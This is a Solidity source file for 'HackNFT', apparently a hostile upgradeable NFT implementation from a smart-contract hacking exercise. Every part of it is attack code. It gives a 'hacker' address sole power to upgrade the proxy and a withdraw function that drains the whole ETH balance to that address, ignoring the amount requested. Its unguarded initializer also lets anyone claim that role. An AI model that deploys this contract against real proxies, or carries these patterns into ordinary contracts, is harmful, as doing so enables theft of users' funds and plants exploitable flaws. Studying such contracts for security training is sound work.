// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {ERC721Upgradeable} from "openzeppelin-contracts-upgradeable/contracts/token/ERC721/ERC721Upgradeable.sol";
import {Initializable} from "openzeppelin-contracts-upgradeable/contracts/proxy/utils/Initializable.sol";
import {UUPSUpgradeable} from "openzeppelin-contracts-upgradeable/contracts/proxy/utils/UUPSUpgradeable.sol";
import {OwnableUpgradeable} from "openzeppelin-contracts-upgradeable/contracts/access/OwnableUpgradeable.sol";
import {MerkleProofUpgradeable} from "openzeppelin-contracts-upgradeable/contracts/utils/cryptography/MerkleProofUpgradeable.sol";
import {MulticallUpgradeable} from "../libraries/Multicall.sol";

contract HackNFT is
    Initializable,
    ERC721Upgradeable,
    UUPSUpgradeable,
    OwnableUpgradeable
{
    bytes32 public merkleRoot;
    uint256 public price;
    uint256 public idCounter;

    address internal hackerAddress;

    modifier onlyHacker() {
        require(msg.sender == hackerAddress, "Caller is not the hacker");
        _;
    }

    function initialize(bytes32 merkleRoot_, uint256 price_) external {
        merkleRoot = merkleRoot_;
        price = price_;
        hackerAddress = msg.sender;
    }

    function _authorizeUpgrade(
        address newImplementation
    ) internal override onlyHacker {}

    function getPrice() public view returns (uint256) {
        return price;
    }

    function withdrawETH(uint256 amount) external onlyHacker {
        payable(msg.sender).transfer(address(this).balance);
    }
}
